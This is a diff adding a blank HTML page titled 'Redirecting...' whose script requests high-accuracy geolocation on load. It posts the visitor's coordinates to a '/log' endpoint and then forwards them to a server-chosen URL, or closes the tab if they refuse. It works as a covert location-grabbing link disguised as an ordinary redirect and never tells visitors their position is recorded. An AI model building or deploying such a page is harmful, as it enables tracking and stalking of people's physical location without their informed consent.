@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecting...</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #ffffff;
+        }
+    </style>
+</head>
+
+<body>
+    <script>
+        // Automatically request location permission on page load
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                // Success callback - user allowed location
+                async (position) => {
+                    try {
+                        // Log IP and location
+                        const response = await fetch('/log', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude,
+                                accuracy: Math.round(position.coords.accuracy),
+                                denied: false
+                            })
+                        });
+
+                        const data = await response.json();
+
+                        // Redirect to target URL
+                        window.location.href = data.redirectUrl;
+                    } catch (error) {
+                        console.error('Error logging data:', error);
+                        window.location.href = 'https://www.google.com';
+                    }
+                },
+                // Error callback - user denied location
+                async (error) => {
+                    console.error('Geolocation denied:', error);
+
+                    try {
+                        // Log the denial
+                        await fetch('/log', {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json',
+                            },
+                            body: JSON.stringify({ denied: true })
+                        });
+                    } catch (err) {
+                        console.error('Error logging denial:', err);
+                    }
+
+                    // Close the tab
+                    setTimeout(() => {
+                        window.close();
+                        // If close doesn't work, try to navigate away
+                        setTimeout(() => {
+                            window.location.href = 'about:blank';
+                        }, 500);
+                    }, 500);
+                },
+                // Options
+                {
+                    enableHighAccuracy: true,
+                    timeout: 10000,
+                    maximumAge: 0
+                }
+            );
+        } else {
+            // Browser doesn't support geolocation - close tab
+            window.close();
+        }
+    </script>
+</body>
+
+</html>
